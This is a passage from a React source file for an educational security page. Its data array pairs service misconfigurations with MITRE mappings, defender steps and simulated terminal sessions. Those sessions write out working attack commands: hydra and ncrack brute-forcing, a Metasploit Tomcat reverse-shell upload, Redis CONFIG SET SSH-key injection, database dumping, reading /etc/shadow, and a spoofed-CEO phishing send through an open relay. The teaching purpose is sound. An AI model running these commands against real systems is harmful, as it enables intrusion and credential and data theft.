/**
 * AttackLibrary.jsx — ETH Attack Combination Library
 * Route: /library
 *
 * Educational flagship page teaching how attackers combine
 * ports + services + misconfigurations into attack paths.
 */

import React, { useState, useMemo, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Search, Filter, Shield, AlertTriangle, Zap, Target, Crosshair, Map, Activity, ShieldAlert, BrainCircuit, TerminalSquare, Eye, Lock, Globe, Server, Database, Network } from 'lucide-react';
import { Radar, RadarChart, PolarGrid, PolarAngleAxis, PolarRadiusAxis, ResponsiveContainer, BarChart, Bar, XAxis, YAxis, Tooltip as RechartsTooltip, Cell, Area, AreaChart } from 'recharts';
import { mitreIntelligenceData } from '../data/mitreIntelligenceData.js';
import ChartExplainer from '../components/ChartExplainer';

// ═══════════════════════════════════════════════════════════════
// DESIGN TOKENS (match ETH exactly)
// ═══════════════════════════════════════════════════════════════
const T = {
    red:    '#ff0033',
    amber:  '#ffaa00',
    blue:   '#00aaff',
    green:  '#00ff9d',
    white:  '#ffffff',
    bg:     '#000000',
    s1:     '#0a0a0a',
    s2:     '#111111',
    s3:     '#1a1a1a',
    border: '#1f1f1f',
    b2:     '#2a2a2a',
    muted:  '#444444',
    sec:    '#888888',
    mono:   'var(--font-mono)',
    sans:   'var(--font-sans)',
    disp:   'var(--font-display)',
};

// ═══════════════════════════════════════════════════════════════
// COMBINATION DATABASE — 48 entries
// ═══════════════════════════════════════════════════════════════
const COMBOS = [
    // ─── BEGINNER (18) ─────────────────────────────────────────
    {
        id:'COMBO-001', tier:'beginner', service:'SMB', port:445,
        name:'SMB + Anonymous Access',
        misconfig:'Anonymous Share Access Enabled',
        tagline:'Zero-credential file system access in enterprise networks.',
        overview:'An SMB server configured to allow anonymous (null session) connections exposes network file shares without requiring any username or password. Attackers enumerate share names, list directory contents, and harvest documents without authentication.',
        whyAttackersCare:'SMB shares frequently contain credentials in script files, backups, and configuration documents. Anonymous access eliminates the need for any prior credential theft — the attacker walks straight in.',
        objectives:['Initial Access','Discovery','Collection','Lateral Movement'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0007','TA0009'],
        mitreTechniques:[{id:'T1078.004',name:'Valid Accounts: Default Accounts'},{id:'T1135',name:'Network Share Discovery'},{id:'T1039',name:'Data from Network Shared Drive'}],
        realWorld:'Used by FIN7, Lazarus Group, and commodity ransomware operators as a quick lateral pivot once inside a network perimeter. Commonly discovered in Shodan-exposed environments.',
        defenderSteps:[
            {priority:'critical',action:'Disable anonymous SMB access via Group Policy: Network access: Do not allow anonymous enumeration of SAM accounts and shares'},
            {priority:'critical',action:'Enable SMB Signing on all domain controllers and member servers'},
            {priority:'high',action:'Audit share permissions and remove Everyone/Authenticated Users from sensitive shares'},
            {priority:'medium',action:'Monitor Windows Event ID 5140 (share access) and 5145 (share object access check)'},
        ],
        interest:98, interestScore:98,
        learningObjective:'Understand why unauthenticated share access is a critical initial access vector and how share enumeration leads to credential harvest.',
        tags:['smb','anonymous','lateral-movement','ransomware'],
        terminal:[
            {type:'command',content:'nmap -p 445 --open 192.168.1.0/24',annotation:'Scan the entire subnet for exposed SMB'},
            {type:'output',content:'Nmap scan report for 192.168.1.14\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds'},
            {type:'command',content:'smbclient -L //192.168.1.14 -N',annotation:'List shares without credentials (-N = no password)'},
            {type:'output',content:'Sharename    Type    Comment\n─────────────────────────────\nADMIN$       Disk    Admin share\nC$           Disk    Default share\nHR_BACKUP    Disk    Human Resources\nFinance2024  Disk'},
            {type:'annotation',content:'// TARGET FOUND: HR_BACKUP — likely contains employee data, credentials, scripts'},
            {type:'command',content:'smbclient //192.168.1.14/HR_BACKUP -N',annotation:'Connect anonymously to HR share'},
            {type:'output',content:'smb: \\> ls\n  passwords_old.txt     2.1KB\n  onboarding_creds.docx 45KB\n  VPN_setup.pdf         1.2MB\n[172 files, 4.2 GB total]'},
            {type:'annotation',content:'// Attacker Objective: Collection. passwords_old.txt is the immediate target.'},
        ],
    },
    {
        id:'COMBO-002', tier:'beginner', service:'FTP', port:21,
        name:'FTP + Anonymous Login',
        misconfig:'Anonymous Authentication Allowed',
        tagline:'File servers open to the world without a single credential.',
        overview:'FTP servers configured to accept the username "anonymous" with any password allow unauthenticated file access. Attackers use this to exfiltrate data, stage malware, or discover internal file structures.',
        whyAttackersCare:'Anonymous FTP is a direct data exfiltration channel or a malware staging platform. Write-enabled anonymous FTP can be used to plant backdoors in web roots.',
        objectives:['Initial Access','Collection','Exfiltration'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0010'],
        mitreTechniques:[{id:'T1078.004',name:'Valid Accounts: Default Accounts'},{id:'T1048',name:'Exfiltration Over Alt Protocol'}],
        realWorld:'Historically abused by warez groups, botnet operators, and data brokers. Still found in IoT devices, legacy servers, and misconfigured cloud storage gateways.',
        defenderSteps:[
            {priority:'critical',action:'Disable anonymous FTP entirely — use SFTP (SSH) or FTPS with certificate auth'},
            {priority:'critical',action:'If FTP must remain: set anonymous access to read-only on a dedicated isolated directory'},
            {priority:'high',action:'Block port 21 at perimeter firewall for all external sources'},
            {priority:'medium',action:'Log all FTP sessions and alert on anonymous logins via SIEM'},
        ],
        interest:82, interestScore:82,
        learningObjective:'Learn why cleartext protocols with anonymous access create both exfiltration and malware staging risks.',
        tags:['ftp','anonymous','exfiltration','legacy'],
        terminal:[
            {type:'command',content:'ftp 10.0.0.52',annotation:'Connect to FTP server'},
            {type:'output',content:'220 FTP Server Ready\nName (10.0.0.52:attacker): anonymous\n331 Please specify the password.\nPassword: [enter anything]'},
            {type:'output',content:'230 Login successful.\nftp> ls\n-rw-r--r--   database_dump_2024.sql\n-rw-r--r--   employee_records.csv\n-rw-r--r--   backup_keys.tar.gz'},
            {type:'annotation',content:'// Attacker Objective: All three files contain sensitive data. No exploit needed — just wget.'},
            {type:'command',content:'wget -m ftp://anonymous:anon@10.0.0.52/',annotation:'Mirror the entire FTP server to local disk'},
        ],
    },
    {
        id:'COMBO-003', tier:'beginner', service:'HTTP', port:80,
        name:'HTTP + Directory Listing',
        misconfig:'autoindex On (Web Server Directory Browsing)',
        tagline:'The web server that shows you its own file system.',
        overview:'When web servers have directory listing enabled, visiting any path without an index file reveals the full directory contents. Attackers use this for reconnaissance — discovering config files, backups, and application source.',
        whyAttackersCare:'Directory listing turns a web server into a searchable file index. Attackers discover .env files, database dumps, and SSH keys without running any exploit.',
        objectives:['Discovery','Collection'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0007','TA0009'],
        mitreTechniques:[{id:'T1083',name:'File and Directory Discovery'},{id:'T1552.001',name:'Credentials In Files'}],
        realWorld:'Automated scanners (Shodan, Nuclei) mass-scan the internet for directory listing. Found on misconfigured Nginx, Apache, and IIS installations. A common first step before deeper exploitation.',
        defenderSteps:[
            {priority:'critical',action:'Nginx: remove autoindex on; Apache: add Options -Indexes in .htaccess or VirtualHost'},
            {priority:'high',action:'Ensure index.html or index.php exists in every web-accessible directory'},
            {priority:'medium',action:'Move all non-public files (configs, backups) outside the web root'},
        ],
        interest:65, interestScore:65,
        learningObjective:'Understand how a single configuration directive exposes an entire file system to unauthenticated browsing.',
        tags:['http','recon','directory-listing','misconfiguration'],
        terminal:[
            {type:'command',content:'curl -s http://target.com/backup/',annotation:'Browse to a directory with no index file'},
            {type:'output',content:'<!DOCTYPE HTML>\n<title>Index of /backup/</title>\n<a href="db_dump_2024-01.sql">db_dump_2024-01.sql</a>\n<a href=".env.production">.env.production</a>\n<a href="id_rsa">id_rsa</a>'},
            {type:'annotation',content:'// SSH private key exposed. Attacker downloads id_rsa and gains shell access.'},
        ],
    },
    {
        id:'COMBO-004', tier:'beginner', service:'HTTP', port:80,
        name:'HTTP + Default Credentials',
        misconfig:'Admin Interface with Unchanged Default Password',
        tagline:'The admin password is still admin:admin.',
        overview:'Web applications, routers, and management consoles often ship with default credentials. When administrators fail to change them, attackers authenticate directly using publicly documented default username/password pairs.',
        whyAttackersCare:'Default credentials require zero exploitation skill. The attacker simply looks up the vendor\'s default password in a public list and logs in. No CVE needed.',
        objectives:['Initial Access','Persistence','Privilege Escalation'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0003'],
        mitreTechniques:[{id:'T1078.001',name:'Valid Accounts: Default Accounts'},{id:'T1133',name:'External Remote Services'}],
        realWorld:'Mirai botnet compromised millions of IoT devices using default credentials. Jenkins, Tomcat, Grafana, and CCTV systems are common targets. Default cred databases (like SecLists) are publicly available.',
        defenderSteps:[
            {priority:'critical',action:'Change all default credentials before production deployment — make this a deployment checklist item'},
            {priority:'critical',action:'Implement MFA on all admin interfaces'},
            {priority:'high',action:'Block admin interfaces from internet access — restrict to internal network or VPN only'},
            {priority:'medium',action:'Scan your own infrastructure with tools like changeme or Nuclei default-creds templates'},
        ],
        interest:95, interestScore:95,
        learningObjective:'Learn why default credentials represent the lowest barrier to initial access and why credential hygiene is non-negotiable.',
        tags:['http','default-creds','admin-panel','iot'],
        terminal:[
            {type:'command',content:'curl -u admin:admin http://target.com/manager/',annotation:'Try Tomcat manager with default creds'},
            {type:'output',content:'HTTP/1.1 200 OK\n<title>Tomcat Web Application Manager</title>'},
            {type:'annotation',content:'// Full admin access gained. Attacker can deploy a WAR file to get RCE immediately.'},
            {type:'command',content:'msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS target.com; set HttpUsername admin; set HttpPassword admin; run"',annotation:'Deploy reverse shell via Tomcat manager'},
        ],
    },
    {
        id:'COMBO-005', tier:'beginner', service:'RDP', port:3389,
        name:'RDP + Weak Passwords',
        misconfig:'No Account Lockout + Weak Password Policy',
        tagline:'The most common ransomware entry point on the planet.',
        overview:'Remote Desktop Protocol exposed to the internet with weak passwords is the single most common initial access vector for ransomware groups. Attackers brute-force or credential-stuff RDP until they find valid credentials, then log in as a legitimate user.',
        whyAttackersCare:'Successful RDP authentication gives the attacker a full graphical desktop session — identical to sitting at the physical keyboard. No further exploitation is needed.',
        objectives:['Initial Access','Lateral Movement','Persistence'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0008'],
        mitreTechniques:[{id:'T1110.003',name:'Brute Force: Password Spraying'},{id:'T1133',name:'External Remote Services'},{id:'T1021.001',name:'Remote Services: RDP'}],
        realWorld:'Conti, LockBit, REvil, and Black Basta all documented RDP as a primary initial access vector. Exposed RDP on port 3389 is indexed by Shodan and actively scanned by botnets every hour.',
        defenderSteps:[
            {priority:'critical',action:'Enforce MFA on RDP — use NLA (Network Level Authentication) at minimum'},
            {priority:'critical',action:'Never expose RDP directly to the internet — put it behind a VPN or VDI gateway'},
            {priority:'critical',action:'Implement account lockout: 5 attempts → 30 minute lockout'},
            {priority:'high',action:'Change RDP port from 3389 (minor friction only, not real security)'},
            {priority:'medium',action:'Alert on authentication failures > 5/minute on port 3389'},
        ],
        interest:97, interestScore:97,
        learningObjective:'Understand why exposed RDP is the #1 ransomware entry point and why MFA + VPN are the only acceptable mitigations.',
        tags:['rdp','brute-force','ransomware','initial-access'],
        terminal:[
            {type:'command',content:'ncrack -vv --user administrator -P /wordlists/rockyou.txt rdp://target.com',annotation:'Brute-force RDP login (thousands of attempts per minute)'},
            {type:'output',content:'Discovered credentials:\n  rdp://target.com 3389 administrator P@ssw0rd1\nRate: 3220 tries/minute'},
            {type:'annotation',content:'// Valid credentials found. Attacker now has a full Windows desktop.'},
            {type:'command',content:'rdesktop -u administrator -p P@ssw0rd1 target.com',annotation:'Log in with stolen credentials'},
        ],
    },
    {
        id:'COMBO-006', tier:'beginner', service:'Telnet', port:23,
        name:'Telnet + Cleartext Transmission',
        misconfig:'Telnet Service Active (deprecated since 2002)',
        tagline:'Every keystroke you type is visible to anyone on the network.',
        overview:'Telnet transmits all data — including usernames, passwords, and commands — in cleartext. Any network-position attacker can passively capture a Telnet session and extract credentials without sending a single packet.',
        whyAttackersCare:'Telnet is a passive intelligence goldmine. The attacker runs tcpdump on an adjacent network segment and reads credentials from the wire in plaintext.',
        objectives:['Credential Access','Initial Access'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006'],
        mitreTechniques:[{id:'T1040',name:'Network Sniffing'},{id:'T1552',name:'Unsecured Credentials'}],
        realWorld:'Telnet is still found on legacy industrial control systems (ICS/SCADA), old network switches, and embedded devices. Mirai and Hajime botnets specifically targeted Telnet-exposed IoT devices.',
        defenderSteps:[
            {priority:'critical',action:'Disable Telnet immediately on all devices — replace with SSH everywhere'},
            {priority:'critical',action:'Assume all Telnet credentials are compromised — rotate them after disabling'},
            {priority:'high',action:'Block port 23 at network perimeter firewall'},
        ],
        interest:88, interestScore:88,
        learningObjective:'Understand why protocol encryption is not optional and why cleartext services are fundamentally insecure regardless of password strength.',
        tags:['telnet','cleartext','sniffing','legacy'],
        terminal:[
            {type:'command',content:'tcpdump -i eth0 -A port 23',annotation:'Passively capture Telnet traffic — no active attack needed'},
            {type:'output',content:'14:32:01.234 IP 192.168.1.5 > 192.168.1.10: Telnet\nlogin: admin\nPassword: Netw0rk@dmin2024\n[admin@router ~]# '},
            {type:'annotation',content:'// Attacker captured admin credentials by simply listening. No exploit. No brute force.'},
        ],
    },
    {
        id:'COMBO-007', tier:'beginner', service:'SSH', port:22,
        name:'SSH + Root Login Enabled',
        misconfig:'PermitRootLogin yes in sshd_config',
        tagline:'Direct root shell — the highest privilege — over the internet.',
        overview:'When SSH is configured to allow direct root login, a successful brute-force or credential stuffing attack immediately yields the highest privilege level on the system. There is no privilege escalation step required.',
        whyAttackersCare:'Root access means full system control from the first authenticated session. The attacker can install backdoors, modify system files, and create new accounts without any further exploitation.',
        objectives:['Initial Access','Privilege Escalation'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0004'],
        mitreTechniques:[{id:'T1110',name:'Brute Force'},{id:'T1078',name:'Valid Accounts'}],
        realWorld:'SSH root login is targeted by automated credential-stuffing botnets that scan all of IPv4 space daily. Compromised root SSH access is sold on dark web access broker markets.',
        defenderSteps:[
            {priority:'critical',action:'Set PermitRootLogin no in /etc/ssh/sshd_config and restart sshd'},
            {priority:'critical',action:'Disable password authentication — use SSH key pairs only (PasswordAuthentication no)'},
            {priority:'high',action:'Install fail2ban or equivalent to rate-limit SSH login attempts'},
            {priority:'medium',action:'Use a non-standard SSH port to reduce automated scan noise (not a security control)'},
        ],
        interest:79, interestScore:79,
        learningObjective:'Learn why least privilege applies to SSH configuration — even authenticated users should not have immediate root access.',
        tags:['ssh','root','brute-force','linux'],
        terminal:[
            {type:'command',content:'hydra -l root -P /wordlists/common.txt ssh://10.0.0.25',annotation:'Brute-force root SSH login'},
            {type:'output',content:'[22][ssh] host: 10.0.0.25  login: root  password: root123\n1 valid password found'},
            {type:'command',content:'ssh root@10.0.0.25',annotation:'Log in as root — full system control immediately'},
            {type:'output',content:'root@production-db:~# whoami\nroot\nroot@production-db:~# cat /etc/shadow'},
        ],
    },
    {
        id:'COMBO-008', tier:'beginner', service:'HTTP', port:80,
        name:'HTTP + Debug Mode',
        misconfig:'Application Running in DEBUG=True (Django/Flask/Rails)',
        tagline:'The application tells attackers everything about itself.',
        overview:'Web frameworks in debug mode expose stack traces, environment variables, internal file paths, and database connection strings to any user who triggers an error. This information dramatically reduces the attacker\'s reconnaissance cost.',
        whyAttackersCare:'Debug mode often exposes SECRET_KEY values, database credentials, API keys, and internal network topology through detailed error pages and interactive debuggers.',
        objectives:['Discovery','Credential Access'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0007','TA0006'],
        mitreTechniques:[{id:'T1592.002',name:'Gather Victim Host Information: Software'},{id:'T1552.001',name:'Credentials In Files'}],
        realWorld:'Django\'s Werkzeug interactive debugger has been exploited to gain RCE on production applications where DEBUG=True was accidentally deployed. A well-known misconfiguration in cloud deployments.',
        defenderSteps:[
            {priority:'critical',action:'Set DEBUG=False in all production deployments — use environment-specific configs'},
            {priority:'critical',action:'Use a custom 404/500 error page that reveals no internal information'},
            {priority:'high',action:'Add deployment checks: fail CI/CD pipeline if DEBUG=True is detected in production configs'},
        ],
        interest:62, interestScore:62,
        learningObjective:'Understand how information disclosure from debug configurations directly accelerates attacker reconnaissance.',
        tags:['http','debug','information-disclosure','web'],
        terminal:[
            {type:'command',content:"curl 'http://target.com/api/user?id='",annotation:'Trigger an error with invalid input'},
            {type:'output',content:'Traceback (most recent call last):\n  File "/app/views.py", line 42\nDatabaseError: ...\nENVIRONMENT:\n  DATABASE_URL = postgres://admin:P@ssDB2024@internal-db:5432/prod\n  SECRET_KEY = django-insecure-abc123xyz\n  AWS_SECRET_ACCESS_KEY = AKIAIOSFODNN7EXAMPLE...'},
            {type:'annotation',content:'// Database password and AWS key exposed in error page. No exploit needed.'},
        ],
    },
    {
        id:'COMBO-009', tier:'beginner', service:'MySQL', port:3306,
        name:'MySQL + Public Exposure + No Password',
        misconfig:'MySQL Bound to 0.0.0.0 with No Root Password',
        tagline:'An internet-facing database with the door wide open.',
        overview:'MySQL configured to listen on all interfaces (0.0.0.0) with no root password is directly accessible from the internet without any authentication. The attacker connects and dumps the entire database in minutes.',
        whyAttackersCare:'Direct database access means immediate access to all application data — user tables, hashed passwords, PII, financial records — without any application-layer controls.',
        objectives:['Initial Access','Collection','Exfiltration'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0009','TA0010'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1005',name:'Data from Local System'}],
        realWorld:'Mass scanning by GandCrab, REvil, and data brokers specifically targets exposed MySQL on port 3306. Hundreds of thousands of databases are accessible on Shodan with no authentication.',
        defenderSteps:[
            {priority:'critical',action:'Bind MySQL to 127.0.0.1 only: bind-address = 127.0.0.1 in my.cnf'},
            {priority:'critical',action:'Set a strong root password: ALTER USER root@localhost IDENTIFIED BY \'...\''},
            {priority:'critical',action:'Block port 3306 at firewall — database should never be internet-accessible'},
        ],
        interest:93, interestScore:93,
        learningObjective:'Understand why databases must never be directly internet-accessible and why network binding configuration matters.',
        tags:['mysql','database','no-auth','exposure'],
        terminal:[
            {type:'command',content:'mysql -h 1.2.3.4 -u root --no-password',annotation:'Connect to remote MySQL with no credentials'},
            {type:'output',content:'Welcome to the MySQL monitor.\nmysql> SHOW DATABASES;\n+--------------------+\n| Database           |\n+--------------------+\n| ecommerce_prod     |\n| user_accounts      |\n| payment_data       |\n+--------------------+'},
            {type:'command',content:"mysqldump -h 1.2.3.4 -u root --no-password ecommerce_prod > dump.sql",annotation:'Dump the entire production database to local file'},
        ],
    },
    {
        id:'COMBO-010', tier:'beginner', service:'VNC', port:5900,
        name:'VNC + No Authentication',
        misconfig:'VNC Server Running Without Password',
        tagline:'A live view of someone\'s desktop — no password needed.',
        overview:'VNC servers with no authentication configured provide anyone with a full graphical desktop session to the target machine. The attacker sees everything on screen and has full mouse and keyboard control.',
        whyAttackersCare:'VNC without auth is equivalent to physical keyboard access. The attacker can operate the machine, install software, and exfiltrate data through the graphical interface.',
        objectives:['Initial Access','Persistence','Collection'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0009'],
        mitreTechniques:[{id:'T1021.005',name:'Remote Services: VNC'},{id:'T1113',name:'Screen Capture'}],
        realWorld:'Dharma and Phobos ransomware groups documented targeting VNC as an alternative to RDP. Thousands of VNC servers appear on Shodan without authentication.',
        defenderSteps:[
            {priority:'critical',action:'Always configure a VNC password — use VeNCrypt for TLS encryption'},
            {priority:'critical',action:'Block port 5900 at perimeter — VNC should only be accessible via VPN'},
            {priority:'high',action:'Switch to a modern, encrypted remote desktop solution (Guacamole, MeshCentral)'},
        ],
        interest:84, interestScore:84,
        learningObjective:'Understand why remote desktop protocols without authentication are equivalent to unlocked physical access.',
        tags:['vnc','remote-desktop','no-auth','ransomware'],
        terminal:[
            {type:'command',content:'vncviewer 1.2.3.4',annotation:'Connect to VNC — no password prompt appears'},
            {type:'output',content:'Connected to RFB server, using protocol version 3.8\n[Desktop session opens — Windows login screen visible]\n[User session already active — desktop visible]'},
            {type:'annotation',content:'// Attacker now has full graphical control. They see the screen, move the mouse, type commands.'},
        ],
    },
    {
        id:'COMBO-011', tier:'beginner', service:'SNMP', port:161,
        name:'SNMP + Default Community Strings',
        misconfig:'Community String: "public" or "private"',
        tagline:'The protocol that tells attackers everything about your network hardware.',
        overview:'SNMP (Simple Network Management Protocol) uses community strings as passwords. Default strings "public" (read) and "private" (write) are universally known. Attackers use them to query full device information, network topology, and running services.',
        whyAttackersCare:'SNMP v1/v2c provides a complete inventory of network devices — interfaces, ARP tables, routing tables, running processes — making network mapping trivially easy.',
        objectives:['Discovery'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0043','TA0007'],
        mitreTechniques:[{id:'T1592',name:'Gather Victim Host Information'},{id:'T1046',name:'Network Service Discovery'}],
        realWorld:'External reconnaissance campaigns routinely target SNMP to map internal network architecture before launching attacks. Used in APT initial reconnaissance phases.',
        defenderSteps:[
            {priority:'critical',action:'Upgrade to SNMPv3 with authentication and encryption (authPriv mode)'},
            {priority:'critical',action:'Change all community strings — never use "public" or "private"'},
            {priority:'high',action:'Block port 161/UDP at perimeter firewall — SNMP should never be internet-accessible'},
        ],
        interest:70, interestScore:70,
        learningObjective:'Learn how management protocols with default credentials provide complete network topology to attackers.',
        tags:['snmp','recon','network','default-creds'],
        terminal:[
            {type:'command',content:"snmpwalk -v2c -c public 1.2.3.4 1.3.6.1.2.1",annotation:'Walk the entire MIB tree with default community string'},
            {type:'output',content:'iso.3.6.1.2.1.1.5.0 = STRING: "corp-router-01"\niso.3.6.1.2.1.4.20.1.1 = IpAddress: 10.0.0.1\niso.3.6.1.2.1.4.20.1.1 = IpAddress: 192.168.1.1\n[2847 OID entries returned]'},
            {type:'annotation',content:'// Complete network topology dumped. Attacker now maps every subnet and device.'},
        ],
    },
    {
        id:'COMBO-012', tier:'beginner', service:'Redis', port:6379,
        name:'Redis + No Authentication',
        misconfig:'No requirepass / No bind restriction',
        tagline:'A database that lets attackers write SSH keys and own the server.',
        overview:'Redis with no authentication and no bind restriction is internet-accessible and fully writable. Attackers use Redis CONFIG commands to write arbitrary files to disk — including SSH authorized_keys or cron jobs — achieving remote code execution.',
        whyAttackersCare:'Redis RCE via CONFIG SET is a documented, reliable technique that requires no exploit — just write access to Redis. The attacker turns a database misconfiguration into full OS shell access.',
        objectives:['Initial Access','Persistence','Privilege Escalation'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0003'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1098.004',name:'Account Manipulation: SSH Authorized Keys'}],
        realWorld:'Cryptominer campaigns, Redis-targeting worms, and ransomware operators exploit unauthenticated Redis as an automated initial access vector. Indexed by Shodan — auto-exploitation begins within minutes of exposure.',
        defenderSteps:[
            {priority:'critical',action:'Enable Redis authentication: requirepass <strong-password> in redis.conf'},
            {priority:'critical',action:'Bind Redis to 127.0.0.1 only: bind 127.0.0.1 in redis.conf'},
            {priority:'critical',action:'Block port 6379 at firewall — Redis must never be internet-accessible'},
            {priority:'high',action:'Run Redis as a non-root user to limit blast radius of CONFIG-based attacks'},
        ],
        interest:95, interestScore:95,
        learningObjective:'Understand how a misconfigured cache server becomes a remote code execution vector through CONFIG write abuse.',
        tags:['redis','no-auth','rce','cryptominer'],
        terminal:[
            {type:'command',content:'redis-cli -h 1.2.3.4',annotation:'Connect to Redis — no password prompt'},
            {type:'output',content:'1.2.3.4:6379> PING\nPONG'},
            {type:'command',content:'redis-cli -h 1.2.3.4 CONFIG SET dir /root/.ssh',annotation:'Point Redis data directory to SSH authorized_keys'},
            {type:'command',content:'redis-cli -h 1.2.3.4 CONFIG SET dbfilename authorized_keys',annotation:'Name the dump file authorized_keys'},
            {type:'command',content:'redis-cli -h 1.2.3.4 SET pwn "\\n\\nattacker-public-key\\n\\n"',annotation:'Write attacker\'s public SSH key'},
            {type:'command',content:'redis-cli -h 1.2.3.4 BGSAVE',annotation:'Flush to disk — SSH key is now written'},
            {type:'output',content:'Background saving started'},
            {type:'command',content:'ssh root@1.2.3.4',annotation:'Log in via the injected SSH key'},
            {type:'output',content:'root@redis-server:~# whoami\nroot'},
        ],
    },
    {
        id:'COMBO-013', tier:'beginner', service:'HTTP', port:80,
        name:'HTTP + Wildcard CORS',
        misconfig:'Access-Control-Allow-Origin: * with credentials',
        tagline:'Any website can read your authenticated API responses.',
        overview:'A wildcard CORS policy (Access-Control-Allow-Origin: *) combined with Access-Control-Allow-Credentials: true allows any malicious website to make cross-origin requests to the API on behalf of an authenticated victim and read the responses.',
        whyAttackersCare:'CORS misconfigurations enable cross-origin credential theft. A victim who visits a malicious website while logged into the vulnerable API will have their data silently exfiltrated to the attacker.',
        objectives:['Credential Access','Collection'],
        killChainStage:'Collection',
        mitreTactics:['TA0009','TA0006'],
        mitreTechniques:[{id:'T1185',name:'Browser Session Hijacking'}],
        realWorld:'Documented in hundreds of API bug bounty reports. Affects SPAs and mobile backends where CORS was misconfigured during rapid development.',
        defenderSteps:[
            {priority:'critical',action:'Never use Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true'},
            {priority:'high',action:'Whitelist specific trusted origins — validate Origin header against an allowlist'},
            {priority:'medium',action:'Use SameSite=Strict or SameSite=Lax cookies to limit cross-origin credential inclusion'},
        ],
        interest:58, interestScore:58,
        learningObjective:'Understand how browser security model violations allow silent cross-origin data theft from authenticated users.',
        tags:['http','cors','api','web'],
        terminal:[
            {type:'command',content:"curl -H 'Origin: https://evil.com' -I https://api.target.com/user/profile",annotation:'Test CORS policy from a malicious origin'},
            {type:'output',content:'HTTP/2 200\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true'},
            {type:'annotation',content:'// Attacker can now read victim\'s profile data from any website the victim visits.'},
        ],
    },
    {
        id:'COMBO-014', tier:'beginner', service:'SMTP', port:25,
        name:'SMTP + Open Relay',
        misconfig:'No Relay Restrictions Configured',
        tagline:'Your mail server sends spam for anyone, worldwide.',
        overview:'An open SMTP relay accepts and forwards emails from any sender to any recipient. Attackers use open relays to send spam, phishing emails, and malware delivery campaigns using your domain\'s reputation.',
        whyAttackersCare:'Phishing emails sent via a trusted domain\'s own mail server bypass email filtering and appear legitimate to recipients. Your reputation is weaponized against your own users.',
        objectives:['Initial Access','Impact'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0040'],
        mitreTechniques:[{id:'T1566',name:'Phishing'},{id:'T1496',name:'Resource Hijacking'}],
        realWorld:'Open relays are used by spam operators to avoid blacklists. Your IP and domain get blacklisted, affecting legitimate email delivery for months.',
        defenderSteps:[
            {priority:'critical',action:'Configure relay restrictions: mynetworks = 127.0.0.0/8 in Postfix (or equivalent)'},
            {priority:'critical',action:'Enable SMTP authentication before relay is permitted'},
            {priority:'high',action:'Implement SPF, DKIM, and DMARC to limit email spoofing damage'},
        ],
        interest:68, interestScore:68,
        learningObjective:'Understand how misconfigured mail servers become phishing infrastructure and damage your domain reputation.',
        tags:['smtp','mail','open-relay','phishing'],
        terminal:[
            {type:'command',content:'telnet target-mail.com 25',annotation:'Connect to SMTP server'},
            {type:'output',content:'220 target-mail.com ESMTP ready'},
            {type:'command',content:'EHLO attacker.com\nMAIL FROM: ceo@target-mail.com\nRCPT TO: victim@bank.com\nDATA\nFrom: CEO <ceo@target-mail.com>\nSubject: Urgent Wire Transfer Required\n[phishing body]\n.',annotation:'Send phishing email via open relay using spoofed CEO address'},
            {type:'output',content:'250 OK: Message accepted for delivery'},
        ],
    },
    {
        id:'COMBO-015', tier:'beginner', service:'HTTP', port:80,
        name:'HTTP + Exposed .git Directory',
        misconfig:'.git Directory Publicly Accessible on Web Server',
        tagline:'The entire source code history — including deleted secrets — is downloadable.',
        overview:'When a Git repository is deployed to a web server without excluding the .git directory, attackers can download the entire repository history. This includes credentials, API keys, and configuration files that were committed and later deleted.',
        whyAttackersCare:'Git history is permanent. Even if a developer commits a secret and immediately deletes it, the commit history retains it forever. Attackers download the full repo and grep for credentials.',
        objectives:['Discovery','Credential Access'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0007','TA0006'],
        mitreTechniques:[{id:'T1552.001',name:'Credentials in Files'},{id:'T1083',name:'File and Directory Discovery'}],
        realWorld:'Thousands of production applications expose .git directories. Tools like git-dumper and GitTools automate full repository extraction from a single URL.',
        defenderSteps:[
            {priority:'critical',action:'Block access to .git in web server config: location ~ /\\.git { deny all; }'},
            {priority:'critical',action:'Use .gitignore to prevent committing secrets — use environment variables for credentials'},
            {priority:'high',action:'Run git-secrets or truffleHog on all repositories to detect committed credentials'},
        ],
        interest:83, interestScore:83,
        learningObjective:'Understand why version control history must be protected and why deleting a committed secret doesn\'t erase it.',
        tags:['git','source-code','credential-theft','web'],
        terminal:[
            {type:'command',content:'curl http://target.com/.git/HEAD',annotation:'Check if .git directory is accessible'},
            {type:'output',content:'ref: refs/heads/main'},
            {type:'command',content:'git-dumper http://target.com/.git/ ./target-repo',annotation:'Download entire repository history'},
            {type:'command',content:'trufflehog filesystem ./target-repo/',annotation:'Scan history for credentials'},
            {type:'output',content:'Found verified credential:\n  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n  Commit: abc123 (3 months ago, deleted in commit def456)'},
        ],
    },
    {
        id:'COMBO-016', tier:'beginner', service:'HTTP', port:80,
        name:'Admin Panel + Internet Exposure',
        misconfig:'Management Interface Accessible Without VPN/Firewall',
        tagline:'The control plane of your application is publicly accessible.',
        overview:'Administrative interfaces (Django admin, WordPress wp-admin, phpMyAdmin, Kubernetes dashboard) exposed directly to the internet without firewall restrictions are targeted by automated scanners and brute-force tools continuously.',
